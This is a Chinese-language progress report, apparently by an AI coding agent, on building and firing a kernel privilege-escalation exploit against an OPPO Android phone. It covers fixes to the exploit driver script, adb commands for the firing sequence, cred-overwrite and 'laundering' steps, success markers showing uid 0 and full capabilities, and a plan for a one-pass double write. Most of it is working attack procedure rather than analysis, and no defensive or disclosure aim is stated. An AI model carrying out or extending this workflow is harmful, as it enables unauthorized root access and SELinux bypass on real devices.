# 发枪准备与阻塞 — 2026-09-18

> 结论先行：**本轮要求的三项代码改动全部完成并通过 19/19 回归测试；但设备未连接，
> 无法发枪。** 手机在 USB 上完全不存在（不只是 adb 看不到）。插上后按下面 §3 的顺序即可开火。

---

## 0. 一处引用缺失

指令里引用的 `delivery/外部建议评审_2026-09-18k_发枪说明.md` **在仓库和工作区里都不存在**：

```
delivery/ 下只有  外部建议评审_2026-09-18.md
find . -name "*发枪*"  →  无结果
```

所以本轮**以消息正文为准**执行，没有去猜那份文件的内容。若那份文件本该存在，请确认路径。

---

## 1. 本轮完成的代码改动

### 1.1 ⛔ §2 —— 会静默吃掉整轮的缺口（已修）

`run_bootA.sh` 取"被装上的那张页"时只认**喷页路径**的措辞，而 `run_w7` 把写值打在**两行**上，
只有一行是无条件的（`src/core/exploit.c`）：

```
L1793   W7[..] write value = private cred page 0x..   ← 只有喷页路径
L1802   W7[..] write_value = 0x..                     ← if/else 之后，所有路径
```

于是 `CONTROL=1` 下抽取结果为空 ⇒ `if [ -n "$CRED" ]` **把整段 repair 跳过**
（`init_cred+8` 保持被写坏），且同值合取式里的 `[ -n "$CRED" ]` 项把 **SV 压成 0**
⇒ `V12_LAUNDER` **恒拒绝**。两处都是静默失效。

**修法**：抽出 `wv_from()` / `wt_from()`，一律取**无条件那行**；两处调用点
（`CRED`、`V5`、`V778`、`SHOT_WT`、`WT778`）全部改走它们。

```sh
wv_from() { sed -n 's/.*write_value *= *\(0x[0-9a-f]*\).*/\1/p' "$@" 2>/dev/null | tail -1; }
wt_from() { sed -n 's/.*write_target= *\(0x[0-9a-f]*\).*/\1/p' "$@" 2>/dev/null | tail -1; }
```

★ 顺带：`write_target` 是**戳判据的输入**（`cred.gid=low32(target)`、`cred.suid=hi32(target)`），
它若抽错，`stamp_ok` 会被喂错目标并对落地的一枪报"没有戳"—— 与 §1.2 同类，所以一并纳入。

### 1.2 `R5` / `R6` —— 按阶段拆开重试

| | 阶段 | 为什么 |
|---|---|---|
| `R5` | step 5，`task+0x778` | **重试安全**：打偏不装任何东西，且戳判据让失败的 round **可读**。`R5=3` 把命中率从 ~p 提到 ~1−(1−p)³。 |
| `R6` | step 6，`task+0x780` | **重试不安全、也不需要**：它只在 step 5 落地后才发火，此时任务已在分歧态，多打一枪只是又一次机会去装上**第二张不同的页**，而一枪落地就够。保持 1。 |

`R5` 默认取 `ROUNDS`，`R6` 默认 `1`。

### 1.3 判据回归测试扩到 19 项

`tools/test_stamp_criterion.sh` 新增第 5 节，覆盖 `wv_from`/`wt_from`，含**负样本对照**：
把旧正则放回 `CONTROL=1` 的样本上必须返回空 —— 已验证，否则这个测试并没有钉住修复。

```
passed=19 failed=0
```

---

## 2. ⛔ 阻塞：设备未连接

```
$ adb devices -l
List of devices attached
                       ← 空

$ fastboot devices
                       ← 空
```

不是 adb 的问题，是**硬件层面没有设备**。`pnputil /enum-devices /connected` 的 USB 树里只有：

```
USB\VID_17EF&PID_61B6...   USB 输入设备（Lenovo）
USB\VID_046D&PID_C09D...   Logitech 鼠标
USB\VID_04F2&PID_B59A...   XiaoMi 摄像头
USB\ROOT_HUB30\...         根集线器
```

**没有任何 OPPO / Qualcomm / QUSB / Fastboot / Composite / MTP 设备。** kill-server + start-server
重启过 adb，两个 adb 可执行文件（项目自带 与 `D:/Android/Sdk/platform-tools/adb`）都试过，
结果一致。⇒ **需要你把手机插上（并确认 USB 调试授权）**，我才能继续。

> 另：本会话的 PowerShell 工具无输出（连 `Write-Output` 都是空），所以硬件核查是用
> `pnputil` 经 bash 做的。这只影响取证手段，不影响上面的结论。

---

## 3. 开火顺序（设备插上后照此执行）

### 3.0 冷启动
前面重启太多次，**先让机器稳定几分钟**再开火，并确认 uptime 在正常增长。

### 3.1 主机侧门（不碰设备，随时可跑）
```bash
cd delivery/ghostlock-pfem10
bash tools/test_stamp_criterion.sh     # 必须 passed=.. failed=0
bash -n run_bootA.sh
```

### 3.2 基线（只读）
```bash
export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*"
ADB="D:/Desktop/CVE-2026-64560/nebussec_pfem10_510/adb.exe"
$ADB -s 91f71075 shell 'getprop ro.boot.bootreason; \
  getprop persist.sys.boot.reason.history; \
  getprop persist.sys.oplus.total_abnormalreboot_count; \
  cat /proc/sys/kernel/random/boot_id; cut -d" " -f1 /proc/uptime; getenforce'
```
★ counter **必须先取基线**：只在重启后读一次，分不清"这次 +1"和"设备历史的 17 次"
（`total_17_dump_0_pmic_17`）。

### 3.3 pstore null test（**必须先做**，否则 §4 的"空 pstore"不算证据）
```bash
$ADB -s 91f71075 reboot          # 干净重启
# 等设备回来 → 立刻用 W1 拿 Permissive → 立刻：
bash postreboot_forensics.sh --baseline
```
判据：脚本必须能产出**非空**记录，或至少给出 `CHANNEL UNREACHABLE` 而不是 `EMPTY`。
★ 时序要紧：开机后 dumper 会把记录搬走并 unlink，**取晚了就是空的**。

### 3.4 发枪
```bash
LAUNDER=1 R5=3 R6=1 HOLD=600 CHAINWAIT=6000 NODRAIN=1 WATCH=180 ./run_bootA.sh
```
★ `HOLD=600` 是必需的：默认 20 会让第一枪的页在第二枪之前被释放，"同值"变悬垂指针。

---

## 4. 里程碑判据（日志里逐字看）

```
stamp_selftest: OK
  [w778rN] round N: STAMP PRESENT — 0x778 LANDED
  [stamp] ASSERTION HOLDS: Uid 4th = ..., Gid 2nd = ...
  [same-value] step 6 will reuse V12_W7_VALUE=0x...
  after repair: [Uid: 0 0 0 0]
  [same-value FACT] ... = 1
  LAUNDER: gate on; same_value_fact=1 ... ids AGREE
  LAUNDER done: uid=0 euid=0 gid=0 status_uid=0 status_gid=0 \
                capeff=0x1ffffffffff caps=1 consistent=1
  180 s services=5/5
```

★★★ **`capeff=0x1ffffffffff` 就是这一枪的里程碑。** `read_cap_eff()` 读的是
`/proc/self/status` = **`real_cred`（0x778）**，洗白前它**必然**是 0（前四轮一直卡在这），
洗白后变满能力 ⇒ 任务手上真的换成了内核分配的 `struct cred`，且 `status_uid` 与 `uid`
由**分裂变一致**。

⚠ 本轮**多一个必看读数**：**`W778_LANDED` 必须真的变成 1** —— 那个门此前从未真正打开过
（`$3`/`$4` 差一）。若它仍是 0，那是判据之外的东西坏了（真没命中），**不是**判据坏了。

### 失败分支表

| 观测 | 读法 |
|---|---|
| `stamp_selftest` 失败 | 判据坏了 —— 先修，别开火 |
| `⛔ ORACLE INCONSISTENT` | `probe_state=D` 与戳矛盾 ⇒ **去查判据**（字段下标／副作用落点），**不要**去追命中率 |
| `⛔ WORSE CASE: step 6 landed but step 5 never landed` | 单独落 0x780 = 分歧对，**禁止洗白** |
| `⚠ step 6 wrote a DIFFERENT page` | 同值保证没成立，**禁止洗白** |
| 死在 step 6/7（还没走到洗白） | **与 cred 无关**，不要当成"洗白有问题"或"页寿命有问题" |
| 洗白瞬间重启 + pstore 出现 `kernel BUG at .../cred.c` | **价值最高的一支** —— 第一次能拿到内核侧证据，**记得把 pstore 原文带上** |
| pstore `EMPTY` | 只有在 null test 通过之后才算证据 |
| pstore `CHANNEL UNREACHABLE` | **不说明任何事**（铁律 8） |

---

## 5. 风险排序

外部数据（同 KMI 的实证）：**同 boot 第二次 walk ≈0% 生存**，死亡点固定在 pre-select，
原因是第一次 walk 留下的 ghost residue。⇒ 推论：**重试打偏的枪是安全的；落地之后再开第二枪
才是危险时刻。**

我方账面（9 个 boot）：**活 3**（run 7/8/12）、**死 6**（3/4/9/10/11/13），
且存活与 walk 数**没有干净相关**（run 7/8 各 3 枪仍活）。

⇒ **不要按他们的 per-walk 数字砍 ROUNDS。** 但要记住上面那条分支表里的那一行：
死在 step 6/7 那一刻，与 cred 无关。

---

## 6. 这一枪**不**做的事

1. ❌ 不回答重启机制
2. ❌ 不碰 pi 侧（`pi.pc/pi.right/pi.left`）
3. ❌ 不碰 physrw
4. ❌ 不碰 CFI
5. ❌ 不用 `CONTROL=1`（会把 `init_cred+8` 全局写坏，搅浑"框架会不会死"这个读数）
6. ❌ 不做持久化（与 RAM-only 目标冲突）

---

## 7. 之后的路（先写下来，免得再讨论）

外部给了同 KMI 的实证：**一个 walk 两个写可行**（`W0.pi`：leaf-NULL → `*(.funcs)=0` +
tree 侧 only-left 写 cred）。这正是应该做的：

```
tree 侧： *(in[2])  = in[0]     ← in[2]=task+0x778, in[0]=V
pi   侧： *(out[0]) = in[3]     ← out[0]=task+0x780, in[3]=V   （同一个 V）
⇒ 一次 walk 得一致对，walk 数 3→1
⇒ 不需要 SAME_VALUE 抽值、不需要第二枪
```

实现全在离线：
1. `fdset_map.h` 的 `fdsetm_write_shape_t` 加 `pi_pc`/`pi_left`（`pi.right` 保持 0，与 tree 侧同形）
2. `fdsetm_build` 加两个 case
3. `prepare_pass_shape` 调用处传新字段
4. **先花 1 个 boot** 用 W1 的 `getenforce` oracle 验证 pi 侧 store **真的执行**：
   `out[0]=p0_alias(SELINUX_ENFORCING)`、`in[3]` 取低字节为 0 的页，**只改 fd_set 字节、不动 δ=0 几何**
5. 通过后再上双写同值版本

⚠ 副作用可能落在 `+8` 或 `+0x10`；若触发 `+0x10`，现在的 repair 只清 8 字节要跟着扩。

---

## 8. 本轮边界

**纯离线**：代码修改 + 回归测试 + 文档。**未上机、未发车、未碰设备**（设备不在）。
`exploit.c` **未改动**，二进制无需重建。
